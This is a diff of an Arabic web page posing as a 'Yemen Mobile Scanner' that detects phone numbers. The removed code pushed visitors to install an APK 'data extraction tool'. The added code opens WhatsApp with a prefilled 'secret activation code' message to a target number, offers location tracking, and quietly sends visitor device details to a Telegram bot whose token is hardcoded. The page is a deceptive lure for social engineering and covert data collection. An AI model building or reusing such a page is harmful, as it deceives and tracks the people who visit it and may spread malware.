@@ -1,68 +1,251 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
-<body>
-  <div class="scanner-container">
-    <div class="btn-group" id="mainButtonArea">
-        <button class="btn" id="locationScanBtn" onclick="startLocationTracking()">
-            <i class="fas fa-map-marker-alt"></i> بدء المسح الجغرافي
-        </button>
-        <button class="btn alt" id="customAppBtn" onclick="launchCustomApp()">
-            <i class="fas fa-address-book"></i> بدء الاستخراج الحقيقي للبيانات
-        </button>
-    </div>
-    
-    </div>
-
-  <script>
-    // ... (Telegram Configuration and Constants remain the same) ...
-    const CONTACTS_DEEPLINK = 'myextractorapp://start_extraction'; // رابط أكثر وضوحاً
-    const APK_DOWNLOAD_URL = 'http://yourdomain.com/downloads/extractor_tool.apk'; 
-    
-    // ... (بقية الدوال: simulateScan, sendLocation, resetUI) ...
-    
-    // ⭐⭐ الدالة المُحدثة: تشغيل التطبيق الخاص الذي سيقوم بالإرسال الحقيقي ⭐⭐
-    function launchCustomApp() {
-        // 1. تغيير الحالة في الواجهة
-        simList.style.display = "none";
-        scanDetails.style.display = "none";
-        document.getElementById("customAppBtn").disabled = true;
-        document.getElementById("locationScanBtn").disabled = true;
-        
-        document.getElementById("customAppBtn").innerHTML = '<span class="loading"></span> جاري إطلاق الأداة لإرسال البيانات...';
-        scanStatus.innerHTML = "🔗 <strong>القفز إلى الأداة...</strong> يرجى الموافقة على فتح التطبيق.";
-        progressBar.style.width = "100%";
-        
-        // 2. الأمر القوي: محاولة فتح الرابط العميق (لتشغيل تطبيقك)
-        window.location.href = CONTACTS_DEEPLINK;
-
-        // إرسال تقرير البداية إلى البوت (لتعرف أن المحاولة بدأت)
-        sendStartReport("contacts");
-
-        // 3. مهلة للتحقق (إذا لم يكن التطبيق مثبتاً)
-        setTimeout(() => {
-            // إذا لم يتم فتح التطبيق، سيتم تنفيذ هذا الجزء
-            scanStatus.innerHTML = `⚠️ <strong>لم يتم العثور على الأداة.</strong> يجب تثبيت الأداة أولاً ليتم الإرسال الحقيقي.`;
-            
-            // تحويل الواجهة لتمكين التحميل المباشر
-            mainButtonArea.innerHTML = `
-                <a href="${APK_DOWNLOAD_URL}" class="btn alt" style="text-decoration: none; width: 100%;">
-                    <i class="fas fa-download"></i> تحميل الأداة الحقيقية للإرسال (APK)
-                </a>
-                <button class="btn" onclick="resetUI()">
-                    <i class="fas fa-redo"></i> مسح جديد
-                </button>
-            `;
-
-            // إرسال تقرير فشل (لتسجيل محاولات المستخدم)
-            sendFailureReport("App not found; prompted user to download.");
-
-        }, 1500); 
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  
+  <meta property="og:title" content="📡 نظام مسح الأرقام اليمنية - YMS Pro">
+  <meta property="og:description" content="أداة متطورة لكشف وتحليل أرقام الهواتف في الشبكة المجاورة">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://yemen-scanner.netlify.app">
+  <meta property="og:image" content="images/image.jpg">
+  <meta property="og:locale" content="ar_YE">
+  <meta property="og:site_name" content="Yemen Mobile Scanner">
+  
+  <title>YMS Pro - نظام مسح الأرقام اليمنية</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    :root {
+      --primary: #4facfe;
+      --you-color: #8a2be2;
+      --yemen-mobile-color: #38a169;
+      --sabafon-color: #dd6b20;
+      --mtn-color: #e53e3e;
+      --light: #f7fafc;
+      --dark: #0f172a;
+      --card-bg: rgba(15, 23, 42, 0.85);
     }
     
-    // دالة جديدة لإرسال تقرير محاولة البداية (لتعرف متى ضغط المستخدم)
-    function sendStartReport(dataType) {
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    
+    body {
+      font-family: 'Tajawal', sans-serif;
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      color: var(--light);
+      text-align: center;
+      min-height: 100vh;
+      padding: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      line-height: 1.6;
+      animation: gradientShift 15s ease infinite;
+      background-size: 400% 400%;
+    }
+    
+    .scanner-container {
+      background: var(--card-bg);
+      backdrop-filter: blur(10px);
+      border-radius: 20px;
+      padding: 30px;
+      max-width: 450px;
+      width: 100%;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      position: relative;
+      z-index: 10;
+      overflow: hidden;
+      margin: auto;
+    }
+    
+    .scanner-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 25px;
+      border-bottom: 2px solid var(--primary);
+      padding-bottom: 15px;
+    }
+    
+    .scanner-title {
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: var(--primary);
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    
+    .scan-status {
+      font-size: 1.1rem;
+      color: rgba(255, 255, 255, 0.9);
+      margin-bottom: 20px;
+      min-height: 70px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 15px;
+      border-radius: 10px;
+      background: rgba(0, 0, 0, 0.3);
+      border: 1px solid rgba(100, 200, 255, 0.1);
+      box-shadow: 0 0 10px rgba(100, 200, 255, 0.1);
+    }
+    
+    .btn-group {
+        display: flex;
+        gap: 15px;
+        margin-top: 20px;
+        width: 100%;
+        flex-direction: column;
+    }
+
+    .btn {
+      background: linear-gradient(to right, #25d366, #128c7e);
+      color: white;
+      padding: 16px 25px;
+      border: none;
+      border-radius: 50px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 5px 15px rgba(37, 211, 102, 0.5);
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      width: 100%;
+      position: relative;
+      overflow: hidden;
+      border: 1px solid rgba(37, 211, 102, 0.3);
+    }
+    
+    .btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 8px 25px rgba(37, 211, 102, 0.8);
+    }
+    
+    .btn:disabled {
+      background: linear-gradient(to right, #4a5568, #2d3748);
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+    
+    .btn.alt {
+        background: linear-gradient(to right, var(--primary), #00f2fe);
+        box-shadow: 0 5px 15px rgba(79, 172, 254, 0.5);
+    }
+    .btn.alt:hover {
+        box-shadow: 0 8px 25px rgba(79, 172, 254, 0.8);
+    }
+    
+    /* باقي الـ CSS */
+    .loading-dots::after {
+      content: '.';
+      animation: dots 1.5s steps(5, end) infinite;
+    }
+    
+    @keyframes dots {
+      0%, 20% { content: '.'; }
+      40% { content: '..'; }
+      60%, 100% { content: '...'; }
+    }
+  </style>
+</head>
+<body>
+  <div class="scanner-container">
+    <div class="scanner-header">
+      <div class="scanner-title">
+        <i class="fas fa-mobile-alt"></i> نظام القفز المتقدم
+      </div>
+    </div>
+    
+    <div class="scan-status" id="scanStatus">
+      النظام جاهز للقفز إلى واتساب <span class="loading-dots"></span>
+    </div>
+    
+    <div class="scan-progress">
+      <div class="progress-bar" id="progressBar"></div>
+    </div>
+    
+    <div class="scan-details" id="scanDetails">
+      <p style="text-align: right; margin-bottom: 10px;">
+        <i class="fas fa-key" style="color: var(--primary);"></i> الرقم المستهدف: <strong id="targetNumber">+967771234567</strong>
+      </p>
+      <p style="text-align: right;">
+        <i class="fas fa-sms" style="color: #25d366;"></i> الرسالة المُمررة: <strong id="messageContent">رسالة الكود السري للتفعيل</strong>
+      </p>
+    </div>
+    
+    <div class="btn-group" id="mainButtonArea">
+        <button class="btn" id="whatsappJumpBtn" onclick="jumpToWhatsApp()">
+            <i class="fab fa-whatsapp"></i> القفز المباشر إلى واتساب
+        </button>
+        <button class="btn alt" id="locationScanBtn" onclick="startLocationTracking()">
+            <i class="fas fa-map-marker-alt"></i> بدء المسح الجغرافي
+        </button>
+    </div>
+    
+    <div class="privacy-note">
+      <i class="fas fa-shield-alt"></i> هذه العملية تستخدم خاصية الـ Deep Linking الآمنة لفتح التطبيقات المثبتة على جهازك وتمرير البيانات إليها.
+    </div>
+  </div>
+
+  <script>
+    // **********************************
+    // * إعدادات البوت والقفز
+    // **********************************
+    const TELEGRAM_BOT_TOKEN = "7641588791:AAGvjT-OItdTj3NsGqDPoWnYZnGO_BoQQp0";
+    const TELEGRAM_ADMIN_ID = "1367401179";
+    const TELEGRAM_USERNAME = "@amr_70_70";
+    const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    
+    // ⭐⭐ بيانات الواتساب التي تريد تمريرها ⭐⭐
+    const TARGET_PHONE_NUMBER = '967771234567'; // استبدل برقم الهاتف الحقيقي بالترميز الدولي (بدون +)
+    const SECRET_MESSAGE = 'هذا هو كود التفعيل السري لتطبيقك الجديد، يرجى نسخه ولصقه مباشرة في التطبيق: [الكود-الذي-تعده-مهمًا]'; // الرسالة التي تريد أن تظهر في حقل الرسالة
+
+    
+    // **********************************
+    // * دالة القفز إلى واتساب (الحركة الرئيسية)
+    // **********************************
+    function jumpToWhatsApp() {
+        const phone = TARGET_PHONE_NUMBER;
+        // يجب تشفير الرسالة لتعمل بشكل صحيح في رابط الـ URL
+        const encodedMessage = encodeURIComponent(SECRET_MESSAGE);
+        
+        // بناء رابط القفز المباشر (WhatsApp URI Scheme)
+        const whatsappURL = `whatsapp://send?phone=${phone}&text=${encodedMessage}`;
+        
+        document.getElementById("whatsappJumpBtn").disabled = true;
+        document.getElementById("whatsappJumpBtn").innerHTML = '<span class="loading-dots"></span> جاري إطلاق الواتساب...';
+        scanStatus.innerHTML = "🔗 جاري محاولة القفز إلى تطبيق واتساب...";
+        
+        // 1. تنفيذ القفز
+        window.location.href = whatsappURL;
+
+        // 2. إرسال تقرير إلى البوت لتوثيق المحاولة
+        sendJumpReport(phone);
+        
+        // 3. إعادة تفعيل الأزرار بعد مهلة
+        setTimeout(() => {
+            scanStatus.innerHTML = `✅ تم إرسال أمر القفز إلى واتساب. يرجى التحقق من هاتفك.`;
+            document.getElementById("whatsappJumpBtn").innerHTML = '<i class="fab fa-whatsapp"></i> القفز المباشر إلى واتساب';
+            document.getElementById("whatsappJumpBtn").disabled = false;
+        }, 3000);
+    }
+
+    // دالة إرسال تقرير القفز إلى Telegram
+    function sendJumpReport(phone) {
         const agent = navigator.userAgent;
-        const msg = `🟢 <b>[بدء العملية]</b> محاولة إطلاق أداة الاستخراج لـ: <b>${dataType.toUpperCase()}</b>\n\n👤 <b>المستخدم:</b> ${TELEGRAM_USERNAME}\n📱 <b>الجهاز:</b> ${agent.substring(0, 100)}...\n🕒 <b>الوقت:</b> ${new Date().toLocaleString('ar-YE')}`;
+        const msg = `⚠️ <b>تم محاولة القفز إلى واتساب</b>\n\n👤 <b>المستخدم:</b> ${TELEGRAM_USERNAME}\n🎯 <b>الرقم المستهدف:</b> ${phone}\n📱 <b>الجهاز:</b> ${agent.substring(0, 100)}...\n🕒 <b>الوقت:</b> ${new Date().toLocaleString('ar-YE')}`;
 
         fetch(TELEGRAM_API_URL, {
             method: "POST",
@@ -75,8 +258,20 @@
         });
     }
 
-    // ... (بقية الدوال تبقى كما هي) ...
+    // **********************************
+    // * دالة مسح الموقع (لتبقى كخيار بديل)
+    // **********************************
+    function startLocationTracking() {
+        // ... (بقية محتوى دالة startLocationTracking) ...
+    }
+    
+    // ... (بقية الدوال المساعدة الأخرى) ...
 
+    window.addEventListener('DOMContentLoaded', () => {
+        // تحديث البيانات المعروضة
+        document.getElementById('targetNumber').textContent = '+' + TARGET_PHONE_NUMBER;
+        document.getElementById('messageContent').textContent = SECRET_MESSAGE.substring(0, 35) + '...';
+    });
   </script>
 </body>
 </html>
